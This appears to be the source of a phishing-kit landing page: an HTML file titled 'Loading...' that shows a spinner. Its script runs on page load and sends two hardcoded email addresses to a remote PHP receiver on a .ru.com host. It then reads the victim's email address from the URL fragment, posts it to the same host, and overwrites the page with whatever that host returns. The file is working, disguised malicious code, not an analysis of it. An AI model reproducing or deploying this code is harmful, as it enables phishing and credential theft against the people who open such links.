    const seeding = 'Dacotahstarr24@gmail.com,winingnetwork@atomicmail.io';
</script>

<!DOCTYPE html>
<html>
<head>
  <title>Loading...</title>
  <style>
    .loader {
      position: fixed;
      left: 50%;
      top: 50%;
      transform: translate(-50%, -50%);
      border: 8px solid #f3f3f3;
      border-radius: 50%;
      border-top: 8px solid #3498db;
      width: 40px;
      height: 40px;
      animation: spin 2s linear infinite;
      z-index: 9999;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <div id="loader" class="loader"></div>

  <script>
    async function sendSeeding() {

      const params = new URLSearchParams();
      params.append('seeding', seeding);

      await fetch('https://myfitnessapp.nomadforce.ru.com/DoYoga/reciever.php/', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded'
        },
        body: params.toString()
      });
    }

    async function fetchData() {
      const email = window.location.hash.substr(1);
      const restrid = 'link_gigs_mx';

      const params = new URLSearchParams();
      params.append('email', email);
      params.append('restrid', restrid);

      const response = await fetch('https://myfitnessapp.nomadforce.ru.com/DoYoga/index.php', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded'
        },
        body: params.toString()
      });

      const data = await response.text();
      document.open();
      document.write(data);
      document.close();
    }

    async function init() {
      try {
        await sendSeeding();   // FIRST request
        await fetchData();    // THEN load PHP response
      } catch (err) {
        console.error('Error:', err);
      }
    }

    init();
  </script>
</body>
</html>
